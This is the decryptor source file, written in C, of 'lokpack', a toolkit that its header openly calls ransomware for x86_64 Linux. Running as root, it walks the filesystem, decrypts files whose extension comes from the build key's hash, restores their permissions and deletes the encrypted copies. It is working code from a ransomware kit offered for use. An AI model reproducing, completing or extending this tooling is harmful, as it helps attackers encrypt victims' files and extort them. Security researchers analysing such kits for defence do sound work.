// clang-format off

/*

 * lokpack | Ransomware tooling for x84_64 Linux
 * Written by ngn (https://ngn.tf) (2024)

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

// clang-format on

#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "../lib/log.h"
#include "../lib/pool.h"
#include "../lib/rsa.h"
#include "../lib/util.h"

typedef struct decrypt_args {
  struct stat *st;
  char *file;
  char *ext;
} decrypt_args_t;

void decrypt_args_free(decrypt_args_t *args){
  free(args->file);
  free(args->st);
  free(args);
}

void decrypt_file(void *arg) {
  decrypt_args_t *args = arg;
  EVP_PKEY_CTX *ctx = NULL;

  unsigned char in_buf[OUTPUT_SIZE];
  unsigned char out_buf[OUTPUT_SIZE];

  size_t in_len  = 0;
  size_t out_len = 0;

  bool ok = false;

  char *in_file = args->file;
  int   name_sz = strlen(in_file) - (strlen(args->ext) + 1);
  char  out_file[name_sz + 1];

  for (int i = 0; i < name_sz; i++)
    out_file[i] = in_file[i];
  out_file[name_sz] = '\0';

  FILE *in  = fopen(in_file, "r");
  FILE *out = fopen(out_file, "a");

  if (NULL == in || NULL == out) {
    debug("Failed to open in/out: %s", in_file);
    goto FREE;
  }

  ctx = rsa_decrypt_init();
  if (NULL == ctx) {
    debug("Failed to create ctx: %s", in_file);
    goto FREE;
  }

  while ((in_len = fread(in_buf, 1, OUTPUT_SIZE, in)) > 0) {
    out_len = OUTPUT_SIZE;
    if (!rsa_decrypt(ctx, in_buf, in_len, out_buf, &out_len)) {
      debug("Failed to decrypt %s (%lu -> %lu)", in_file, in_len, out_len);
      goto FREE;
    }

    if (fwrite(out_buf, 1, out_len, out) <= 0) {
      debug("Failed to write output: %s", in_file);
      goto FREE;
    }

    if (in_len < OUTPUT_SIZE)
      break;
  }

  if (!copy_stat(fileno(out), args->st)) {
    debug("Failed to copy perms: %s", in_file);
    goto FREE;
  }

  if (unlink(in_file) < 0) {
    debug("Failed to unlink: %s", in_file);
    goto FREE;
  }

  ok = true;

FREE:
  if (NULL != ctx)
    rsa_decrypt_free(ctx);

  if (NULL != in)
    fclose(in);

  if (NULL != out)
    fclose(out);

  if (!ok) {
    error("Failed to decrypt file: %s", in_file);
    unlink(out_file);
  }

  decrypt_args_free(args);
}

void decrypt_files(char *path, char *ext, threadpool pool) {
  if (eq(path, "/proc") || eq(path, "/sys") || eq(path, "/dev") || eq(path, "/run"))
    return;

  if (path[1] != '\0' && is_root_path(path))
    info("Decrypting %s...", path);

  DIR *dir = opendir(path);
  if (NULL == dir)
    return;

  struct dirent *ent;
  char           fp[PATH_MAX];

  while ((ent = readdir(dir)) != NULL) {
    if (eq(ent->d_name, "."))
      continue;
    else if (eq(ent->d_name, ".."))
      continue;

    join(fp, path, ent->d_name);
    if (access(fp, R_OK & W_OK) < 0)
      continue;

    struct stat st;
    if (stat(fp, &st) < 0)
      continue;

    if ((st.st_mode & S_IFMT) == S_IFDIR) {
      debug("Decrypting directory: %s...", fp);
      decrypt_files(fp, ext, pool);
      continue;
    }

    if (st.st_size <= 0)
      continue;

    if (!has_valid_ext(fp, ext))
      continue;

    decrypt_args_t *args = malloc(sizeof(decrypt_args_t));
    args->file = strdup(fp);
    args->ext  = ext;

    args->st   = malloc(sizeof(struct stat));
    memcpy(args->st, &st, sizeof(struct stat));

    debug("Decrypting file: %s...", fp);
    thpool_add_work(pool, decrypt_file, args);
  }

  closedir(dir);
  return;
}

int main(int argc, char *argv[]) {
  if (getuid() != 0) {
    error("Please run as root!");
    return EXIT_FAILURE;
  }

  char ext[8] = {0}, *sum = get_md5(BUILD_PUB);
  snprintf(ext, 8, "%.5s", sum);

  if (access("/", R_OK & W_OK) < 0) {
    error("Failed to access the root path");
    goto DONE;
  }

  if (!rsa_init(BUILD_PRIV, false)) {
    error("Failed to init RSA key");
    goto DONE;
  }

  threadpool pool = thpool_init(20);
  if (argc >= 2)
    decrypt_files(argv[1], ext, pool);
  else
    decrypt_files("/", ext, pool);
  thpool_wait(pool);

DONE:
  thpool_destroy(pool);
  rsa_free();
}
